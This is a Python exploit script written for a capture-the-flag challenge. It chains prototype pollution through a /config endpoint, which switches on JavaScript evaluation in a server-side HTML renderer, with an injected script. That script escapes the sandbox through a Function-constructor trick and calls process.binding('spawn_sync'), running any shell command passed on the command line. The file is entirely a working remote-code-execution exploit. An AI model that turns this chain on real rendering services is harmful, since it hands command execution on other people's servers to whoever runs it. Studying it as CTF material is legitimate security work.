import urllib.request
import json
import sys

URL = "http://challenges4.ctf.sd:33184"

def post(url, data):
    req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req) as f:
            return f.read().decode('utf-8')
    except Exception as e:
        return str(e)

def pollute():
    print("Polluting...")
    payload = {
        "myproto": "[Circular (__proto__)]",
        "myproto.settings.enableJavaScriptEvaluation": True,
        "myproto.settings.disableJavaScriptEvaluation": False,
        "myproto.settings.enableFileSystemHttpRequests": True,
        "myproto.settings.disableJavaScriptFileLoading": False
    }
    res = post(f"{URL}/config", payload)
    print(res)

def render(cmd):
    print(f"Executing: {cmd}")
    parts = cmd.split()
    exe = parts[0]
    if exe == "ls":
        file_path = "/bin/ls"
    elif exe == "cat":
        file_path = "/bin/cat"
    else:
        file_path = exe
    
    args_js = json.dumps(parts)
    
    script = f"""
    <script>
    try {{
        const proc = console.log.constructor("return process")();
        const spawn = proc.binding("spawn_sync").spawn;
        const res = spawn({{
            file: "{file_path}",
            args: {args_js},
            cwd: "/",
            envPairs: [],
            stdio: [
                {{ type: "pipe", readable: true, writable: false }},
                {{ type: "pipe", readable: false, writable: true }},
                {{ type: "pipe", readable: false, writable: true }}
            ]
        }});
        let output = "";
        if (res.output && res.output[1]) {{
            output = res.output[1].toString();
        }} else {{
            output = JSON.stringify(res);
        }}
        document.body.innerHTML = output; 
    }} catch(e) {{
        document.body.innerHTML = e.toString();
    }}
    </script>
    """
    
    res = post(f"{URL}/render", {"html": script})
    print("Result:")
    print(res)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "ls /"
    
    pollute()
    render(cmd)
